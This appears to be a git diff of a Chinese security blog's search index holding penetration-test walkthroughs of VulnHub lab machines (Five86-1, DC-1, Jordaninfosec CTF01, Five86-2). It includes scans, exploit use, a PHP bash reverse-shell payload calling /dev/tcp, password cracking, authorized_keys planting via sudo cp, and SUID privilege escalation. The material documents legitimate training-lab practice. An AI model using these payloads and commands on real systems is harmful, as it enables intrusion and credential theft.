class="keyword">through</span> <span class="keyword">of</span> this.</span><br><span class="line"></span><br><span class="line">It <span class="keyword">is</span> currently configured <span class="keyword">for</span> Bridged Networking, however, this can be changed <span class="keyword">to</span> suit your requirements. Networking <span class="keyword">is</span> configured <span class="keyword">for</span> DHCP.</span><br><span class="line"></span><br><span class="line">Installation <span class="keyword">is</span> simple - download <span class="keyword">it</span>, unzip <span class="keyword">it</span>, <span class="keyword">and</span> <span class="keyword">then</span> import <span class="keyword">it</span> <span class="keyword">into</span> VirtualBox <span class="keyword">or</span> VMWare <span class="keyword">and</span> away you go.</span><br><span class="line"></span><br><span class="line">Important</span><br><span class="line">While there should be no problems using this VM, <span class="keyword">by</span> downloading <span class="keyword">it</span>, you accept full responsibility <span class="keyword">for</span> any unintentional damage <span class="keyword">that</span> this VM may cause.</span><br><span class="line"></span><br><span class="line">In saying <span class="keyword">that</span>, there shouldn't be any problems, <span class="keyword">but</span> I feel <span class="keyword">the</span> need <span class="keyword">to</span> throw this out there just <span class="keyword">in</span> case.</span><br><span class="line"></span><br><span class="line">Credits</span><br><span class="line">A big thanks goes out <span class="keyword">to</span> <span class="keyword">the</span> members <span class="keyword">of</span> @m0tl3ycr3w.</span><br><span class="line"></span><br><span class="line">Contact</span><br><span class="line">I'm also very interested <span class="keyword">in</span> hearing how people go <span class="keyword">about</span> solving these challenges, so <span class="keyword">if</span> you're up <span class="keyword">for</span> writing a walkthrough, please do so <span class="keyword">and</span> send <span class="keyword">me</span> a link, <span class="keyword">or</span> alternatively, follow <span class="keyword">me</span> <span class="keyword">on</span> Twitter, <span class="keyword">and</span> DM <span class="keyword">me</span> (you can unfollow <span class="keyword">after</span> you've DM'd <span class="keyword">me</span> <span class="keyword">if</span> you'd prefer).</span><br><span class="line"></span><br><span class="line">I can be contacted via Twitter - @Five86_x</span><br></pre></td></tr></table></figure>
 
-<h3 id="web-目录枚举"><a href="#web-目录枚举" class="headerlink" title="web 目录枚举"></a>web 目录枚举</h3><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta">############# /robots.txt ################ #</span></span><br><span class="line"><span class="meta"># robots.txt</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># This file is to prevent the crawling and indexing of certain parts</span></span><br><span class="line"><span class="meta"># of your site by web crawlers and spiders run by sites like Yahoo!</span></span><br><span class="line"><span class="meta"># and Google. By telling these <span class="string">"robots"</span> where not to go on your site,</span></span><br><span class="line"><span class="meta"># you save bandwidth and server resources.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># This file will be ignored unless it is at the root of your host:</span></span><br><span class="line"><span class="meta"># Used:</span></span><br><span class="line"><span class="meta"># Ignored: #</span></span><br><span class="line"><span class="meta"># For more</span></span><br><span class="line"><span class="meta"># http:<span class="comment">//www.robotstxt.org/wc/robots.html #</span></span></span><br><span class="line"><span class="meta"># For syntax checking, see:</span></span><br><span class="line"><span class="meta"># http:<span class="comment">//www.sxw.org.uk/computing/robots/check.html</span></span></span><br><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: <span class="number">10</span></span><br><span class="line"><span class="meta"># Directories</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/includes/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/misc/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/modules/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/profiles/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/scripts/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/themes/</span></span><br><span class="line"><span class="meta"># Files</span></span><br><span class="line"><span class="symbol">Disallow:</span> /CHANGELOG.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /cron.php</span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.mysql.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.pgsql.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.sqlite.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /install.php </span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /LICENSE.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /MAINTAINERS.txt</span><br><span class="line"><span class="symbol">Disallow:</span> /update.php </span><br><span class="line"><span class="symbol">Disallow:</span> /UPGRADE.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /xmlrpc.php</span><br><span class="line"><span class="meta"># Paths (clean URLs) </span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/admin/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/comment/</span>reply/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/filter/</span>tips/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/node/</span>add/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/search/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>register/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>password/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>login/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>logout/</span><br><span class="line"><span class="meta"># Paths (no clean URLs)</span></span><br><span class="line"><span class="symbol">Disallow:</span> /?q=admin/ </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=comment<span class="meta-keyword">/reply/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=filter<span class="meta-keyword">/tips/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=node<span class="meta-keyword">/add/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=search/ </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/password/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/register/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/login/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/logout/</span></span><br></pre></td></tr></table></figure>
+<br>
+<br>
 
-<p><img src="2020-03-17-11-17-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-17-23屏幕截图"> </p>
-<p>逐一访问，得到如下信息：</p>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Kali : 192.168.56.109</span><br><span class="line">目标网段 : 192.168.56.1/24</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br>
+
+<p>主机存活：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -s -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
+
+<p>扫服务：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.114</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<hr>
+<br>
+
+<p>访问 80 端口，无有价值信息</p>
+<p>例行扫目录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch.py -u http://192.168.56.114 -e php --random-agents</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-14-35-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>经访问：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">########################</span></span><br><span class="line">[14:35:21] 200 -   30B  - /index.html    <span class="comment"># 404</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports          <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports/Webalizer/   <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 200 -   29B  - /robots.txt</span><br><span class="line"><span class="comment">#####</span></span><br><span class="line">http://192.168.56.114/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /ona</span><br><span class="line"><span class="comment">########################</span></span><br><span class="line">http://192.168.56.114/ona	<span class="comment"># OpenNetAdmin</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-14-45-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>搜索相关漏洞，得到远程命令执行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit opennetadmin</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-02-14-14-44-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<h2 id="海滩登陆"><a href="#海滩登陆" class="headerlink" title="海滩登陆"></a>海滩登陆</h2><br>
+
+<p>使用 <code>47691.sh</code> 如果报错的话，可以先 <code>dos2unix</code> 转换一下格式，作者可能在 <code>dos</code> 环境下写的脚本</p>
+<br>
+
+<p><img src="2020-02-14-18-38-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+<br>
+
+<p>使用 MSF：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先复制到桌面</span></span><br><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/47772.rb ~/Desktop/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到 MSF 内利用</span></span><br><span class="line">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-15-10-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
+<br>
+
+<p>测试发现存在 <code>Python</code> 使用交互式 shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; shell</span><br><span class="line"></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>先看 <code>/etc/passwd</code> 有多少用户及有价值信息。目录全无访问权</p>
+<br>
+
+<p><img src="2020-02-14-15-13-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
+<p><img src="2020-02-14-15-13-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>这个时就需要最后的搜刮一下，得到了一组用户密码。其他用户，无有价值信息：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -ri --color=auto --exclude-dir=proc/ <span class="string">'douglas'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-15-28-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
+<p><img src="2020-02-14-15-30-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<hr>
+<br>
+
+<p>Hash 破解，没跑成来，查了一下，会用到作者给的提示 <code>aefhrt</code>。使用 <code>crunch</code> 生产字典：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ crunch 10 10 aefhrt &gt;word.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ crunch 10 10 aefhrt -o word.txt</span><br><span class="line"></span><br><span class="line">$ john --wordlist=word.txt <span class="built_in">hash</span> </span><br><span class="line">$ john --show <span class="built_in">hash</span> </span><br><span class="line"></span><br><span class="line">?:fatherrrrr</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-15-51-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<h2 id="身份切换-SSH免密登陆"><a href="#身份切换-SSH免密登陆" class="headerlink" title="身份切换(SSH免密登陆)"></a>身份切换(SSH免密登陆)</h2><br>
+
+<p>登录 SSH，得到普通用户，目录下除了 <code>.ssh/</code> 外无其他有价值信息。</p>
+<p>可使用的 <code>sudo</code> 命令为 <code>cp</code> ：</p>
+<br>
+
+<p><img src="2020-02-14-16-03-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>涉及知识的盲区了，特地去查询记录了一下</p>
+<br>
+
+<p><code>cp</code> 命令可以配合  <code>SSH（authorized_keys）</code> 免密登录到其他用户：</p>
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 为目标生成 ssh key</span></span><br><span class="line">ssh-keygen -b 2048</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制生成的 id_rsa.pub 到 /tmp 下并改名为 authorized_kes</span></span><br><span class="line">cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_kes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改变 authorized_kes 的权限</span></span><br><span class="line">chmod 777 authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到目标 .ssh/ 下</span></span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登陆</span></span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<br>
+
+<p><img src="2020-02-14-16-16-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-14-16-18-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>说是有邮件，查看邮件，得到另一组用户名和密码，登陆成功。</p>
+<br>
+
+
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><br>
+
+<p>看目录，得到一个 <code>SUID</code> 的二进制文件，可以直接成为 <code>root</code> ，进 <code>root</code> 目录，得到 Flag</p>
+<br>
+<br>
+
+<p><img src="2020-02-14-16-25-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-14-16-28-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<hr>
+<br>
+
+<p>与其说是提权，不如说是作者准备好的外挂道具，让你可以一举成神，有种欲求不满的感觉，前面刚鼓起的劲，到了后面直接一键 <code>root</code> ，无法满足啊</p>
+<br>
+
+<p>不过，也是学到技能了</p>
+<br>
+
+<p>也可以使用如下方式：</p>
 <ul>
-<li>CMS：Drupal</li>
-<li>版本：7.X</li>
+<li>创建一个权限 <code>777</code> 的文件</li>
+<li>使用 <code>find</code> 命令查找 <code>Jen</code> 创建的文件</li>
+<li>使用 <code>cp</code> 命令，复制找到的文件 到 <code>777</code> 权限的 文件</li>
+<li><code>cat</code> 查看</li>
 </ul>
-<p><img src="2020-03-17-11-48-03%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-48-03屏幕截图"> </p>
-<h2 id="漏洞利用-Getshell"><a href="#漏洞利用-Getshell" class="headerlink" title="漏洞利用(Getshell)"></a>漏洞利用(Getshell)</h2><p>搜索历史漏洞，找一个可正常利用的，有的会因为各种问题无法使用</p>
-<p>在 MSF 上搜到几个，挑个利用：</p>
-<p><code>use exploit/unix/webapp/drupal_drupalgeddon2</code> </p>
-<p><img src="2020-03-17-11-48-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-48-51屏幕截图"> </p>
-<p><img src="2020-03-17-12-12-26%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-12-26屏幕截图"> </p>
-<p><img src="2020-03-17-12-18-40%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-18-40屏幕截图"></p>
-<h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
-<li>登陆用户：www-data</li>
-<li><code>Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux</code> </li>
-<li><code>/etc/passwd</code> <ul>
-<li><code>flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</code> </li>
-</ul>
-</li>
-</ul>
-<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>查看当前目录，得到一个 flag， <code>flag4</code>用户下得到第二个 flag</p>
-<p><img src="2020-03-17-12-29-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-29-33屏幕截图"></p>
-<p>flag1 提示找 Drupal 的配置文件，百度一下 Drupal 的配置文件一般位于 <code>/var/www/sites/default/</code> </p>
-<p>文件名是 <code>settings.php</code> </p>
-<p> <code>find</code> 一下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name settings.php 2&gt;/dev/null </span><br><span class="line">/var/www/sites/default/settings.php</span><br></pre></td></tr></table></figure>
+<br>
 
-<p>查看后得到 flag2 和一组用户名密码，登陆数据库得到两个用户名(第三个是我自己加的)，密码被加密，暂时没有作用</p>
-<p><img src="%E6%88%AA%E5%B1%8F2020-03-1712.36.32.png" alt="截屏2020-03-1712.36.32"> </p>
-<p><img src="2020-03-17-12-45-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-45-25屏幕截图"> </p>
-<p><img src="2020-03-17-13-16-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-13-16-07屏幕截图"> </p>
-<p><img src="%E6%88%AA%E5%B1%8F2020-03-1916.11.12.png" alt="截屏2020-03-1916.11.12"> </p>
-<h3 id="密码枚举"><a href="#密码枚举" class="headerlink" title="密码枚举"></a>密码枚举</h3><p>flag2 提到了密码爆破不是唯一的方法，可能是通过修改数据库内某个用户的密码，不想这么麻烦</p>
-<p>听歌的时候想到了还有个 flag4 用户，既然存在，那肯定有其道理，试试能不能枚举<br><code>hydra</code> 爆破 ssh，因为刚装的系统，密码字典还没下载，就先用 <code>john</code> 的，还真得到了密码</p>
-<p><img src="2020-03-17-14-25-48%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-14-25-48屏幕截图"> </p>
-<h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p>登录 ssh，查看 SUID ，<code>find</code> 提权</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/find	<span class="comment"># &lt;---</span></span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/pt_chown </span><br><span class="line">/usr/lib/openssh/ssh-keysign </span><br><span class="line">/usr/lib/eject/dmcrypt-get-device </span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper </span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo -u</span></span><br><span class="line">-u, --user=user              <span class="comment"># 以指定用户或 ID</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="%E6%88%AA%E5%B1%8F2020-03-1715.10.08.png" alt="截屏2020-03-1715.10.08"> </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ find ./ -<span class="built_in">type</span> f -name flag4.txt -<span class="built_in">exec</span> <span class="string">"whoami"</span> \; </span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+<br>
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ find ./ -<span class="built_in">type</span> f -name flag4.txt -<span class="built_in">exec</span> <span class="string">"/bin/sh"</span> \;</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># cat thefinalflag.txt</span></span><br></pre></td></tr></table></figure>
-
-<p>都提权了，其他 flag 也就无所谓了</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">flag</span></span><br><span class="line"><span class="selector-tag">flag2</span></span><br><span class="line"><span class="selector-tag">flag4</span></span><br><span class="line"><span class="selector-tag">thefinalflag</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u jen /bin/cp /var/mail/jen ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -1412,6 +1527,256 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
 
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.110/robots.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">################</span></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Disallow: /backup</span><br><span class="line">Disallow: /admin</span><br><span class="line">Disallow: /admin_area</span><br><span class="line">Disallow: /r00t</span><br><span class="line">Disallow: /uploads      ----- Not Found 404</span><br><span class="line">Disallow: /uploaded_files ----- OK 200</span><br><span class="line">Disallow: /flag </span><br><span class="line">================</span><br><span class="line">http://192.168.56.110/admin_area/</span><br><span class="line"></span><br><span class="line"><span class="comment">##################</span></span><br><span class="line">&lt;!--	username : admin</span><br><span class="line">	password : 3v1l_H@ck3r</span><br><span class="line">	The 2nd flag is : &#123;7412574125871236547895214&#125;</span><br><span class="line">--&gt;</span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/assets/img/</span><br><span class="line"></span><br><span class="line"><span class="comment">################</span></span><br><span class="line">[IMG]	background_tile_1.jpg	2017-04-19 10:43 	2.3K	 </span><br><span class="line">[IMG]	background_tile_2.jpg	2017-04-19 10:43 	2.4K	 </span><br><span class="line">[IMG]	background_tile_3.jpg	2017-04-19 10:43 	2.3K	 </span><br><span class="line">[IMG]	blue_line.jpg	2017-04-19 10:43 	1.3K	 </span><br><span class="line">[IMG]	done.png	2017-04-19 10:43 	3.3K	 </span><br><span class="line">[IMG]	logo.jpg	2017-04-19 10:43 	11K	 </span><br><span class="line">[IMG]	tzine.png	2017-04-19 10:43 	1.2K	 </span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/flag/</span><br><span class="line"></span><br><span class="line"><span class="comment">###############</span></span><br><span class="line">The 1st flag is : &#123;8734509128730458630012095&#125;</span><br><span class="line"></span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/server-status</span><br><span class="line"></span><br><span class="line"><span class="comment">###############</span></span><br><span class="line">注意 Cookie</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##################</span></span><br><span class="line">http://192.168.56.110/index.php</span><br><span class="line"></span><br><span class="line">登录后：</span><br><span class="line"></span><br><span class="line">Powered by : Technawi[dot]net</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=======================</span><br><span class="line">meterpreter &gt; cat hint.txt</span><br><span class="line">try to find user technawi password to <span class="built_in">read</span> the flag.txt file, you can find it <span class="keyword">in</span> a hidden file ;)</span><br><span class="line"></span><br><span class="line">The 3rd flag is : &#123;7645110034526579012345670&#125;</span><br><span class="line"></span><br><span class="line">=======================</span><br><span class="line">cat /etc/mysql/conf.d/credentials.txt</span><br><span class="line">The 4th flag is : &#123;7845658974123568974185412&#125;</span><br><span class="line"></span><br><span class="line">username : technawi</span><br><span class="line">password : 3vilH@ksor</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line">technawi@Jordaninfosec-CTF01:~$ cat /var/www/html/flag.txt </span><br><span class="line">The 5th flag is : &#123;5473215946785213456975249&#125;</span><br><span class="line"></span><br><span class="line">Good job :)</span><br><span class="line"></span><br><span class="line">You find 5 flags and got their points and finish the first scenario....</span><br></pre></td></tr></table></figure>
 
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>vulnhub</tag>
+        <tag>OSCP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Five86-2</title>
+    <url>/2020/03/19/Five86-2/</url>
+    <content><![CDATA[<blockquote>
+<p>2020-02-26</p>
+</blockquote>
+<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp      ProFTPD 1.3.5e</span><br><span class="line">80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))</span><br></pre></td></tr></table></figure>
+
+<p>无 <code>ProFTPD 1.3.5e</code> 相关漏洞，无法匿名登录</p>
+<p>后台放置目录枚举，<code>WordPress</code> 站点 <code>wpscan</code> 扫描</p>
+<p><img src="2020-02-26-15-21-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-21-50屏幕截图"> <img src="2020-02-26-15-22-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-22-25屏幕截图"> </p>
+<p>逐一访问，无有价值信息，<code>wpscan</code> 枚举出了几个用户名：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">barney</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephen</span><br></pre></td></tr></table></figure>
+
+<p>尝试枚举爆破，枚举出两个密码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.56.117 -U tmp/user.txt -P /usr/share/wordlists/rockyou.txt -t 30</span><br><span class="line"></span><br><span class="line"><span class="comment"># [SUCCESS] - barney / spooky1                                                                 </span></span><br><span class="line"><span class="comment"># [SUCCESS] - stephen / apollo1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-02-26-15-53-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-53-05屏幕截图"> </p>
+<p><img src="2020-02-26-16-37-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-16-37-11屏幕截图"> </p>
+<h2 id="撬开大门"><a href="#撬开大门" class="headerlink" title="撬开大门"></a>撬开大门</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">barney ： spooky1   </span><br><span class="line">stephen ： apollo1</span><br></pre></td></tr></table></figure>
+
+<p>两个账号均可登录后台，不过 <code>stephen</code> 无利用点</p>
+<p><code>barney</code> 登陆后，有三个插件，搜索相关漏洞，除第三个插件外，其他暂无价值：</p>
+<p>根据 <code>PoC</code> 说明，写出 <code>exp</code> ，上传后，本地端口监听，访问上传网址，得到 <code>shell</code>：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> exec(<span class="string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.109/8848 0&gt;&amp;1'"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>注意：用 <code>echo</code> 写入的时候注意引号的转义，写入后最好再查看一遍利用脚本的内容是否正确</p>
+<p><img src="2020-02-26-17-37-01%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-37-01屏幕截图"></p>
+<p><img src="2020-02-26-17-37-18%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-37-18屏幕截图"> <img src="2020-02-26-17-34-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="被忽略的转义"></p>
+<h2 id="登堂入室"><a href="#登堂入室" class="headerlink" title="登堂入室"></a>登堂入室</h2><p>接收到了 <code>shell</code> 先收集一波信息，最喜欢的 <code>/etc/passwd</code> 里总是包含用户及其主目录，<code>HOME</code> 下的用户目录无访问权限</p>
+<p>各种信息收集了一波，当前用户的作用实在不大。无思路无目的时候，就是收集的情报不够，整理一下现有资料：</p>
